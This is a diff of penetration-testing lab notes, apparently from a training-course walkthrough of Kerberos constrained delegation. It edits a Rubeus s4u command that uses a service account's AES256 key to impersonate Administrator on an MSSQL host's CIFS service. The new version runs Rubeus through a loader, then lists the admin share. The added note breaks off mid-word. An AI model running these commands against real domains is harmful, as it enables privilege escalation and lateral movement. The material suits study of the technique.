@@ -13,11 +13,15 @@ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne
 
 Request a `TGT` and `TGS` and impersonate any user
 ```powershell
-Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e87
-9470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
+.\Loader.exe -path .\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
 ```
 
 Test
 ```powershell
-ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
 ```
+
+ 
+> [!NOTE] **NOTE**
+> You can cr
+
